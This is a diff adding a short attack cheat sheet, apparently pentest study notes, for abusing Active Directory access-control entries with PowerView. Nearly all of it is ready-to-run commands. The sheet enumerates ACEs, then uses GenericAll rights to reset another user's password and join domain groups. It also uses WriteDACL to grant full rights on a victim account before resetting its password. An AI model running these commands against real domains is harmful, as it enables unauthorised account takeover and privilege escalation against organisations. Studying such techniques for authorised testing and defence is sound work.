@@ -1,0 +1,31 @@
+[ENUM]
+
+First load PowerView:
+PS C:\tools> .\PowerView.ps1
+
+Get ACL config:
+PS C:\tools> Get-ObjectAcl -Identity domainuser
+
+Convert the SID to a user or group name:
+PS C:\tools>  ConvertFrom-SID S-1-5-21-3776646582-2086779273-4091361643-553
+
+Automated above:
+Get-ObjectAcl -Identity offsec -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
+
+[GENETIC ALL ABUSE]
+
+Enumeration of all ACEs of all users in the domain / If Found set the new password for specific domain user:
+PS C:\tools> Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
+PS C:\tools> net user user_domain_target h4x /domain (Generic access to another account, resulting in the possibility of changing the password)
+
+Enumeration of all ACEs of all groups in the domain / If found change the user to a specific domain group:
+PS C:\tools >Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
+PS C:\tools> net group domain_group user_domain /add /domain
+
+[WRITEDACL ABUSE]
+
+Enumeration of all objects in Active Directory that have a DACL and a particular object access right ( WriteDACL ):
+PS C:\tools> Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
+
+PS C:\tools> Add-DomainObjectAcl -TargetIdentity user_victim -PrincipalIdentity user_attack -Rights All
+PS C:\tools> net user user_victim h4x /domain
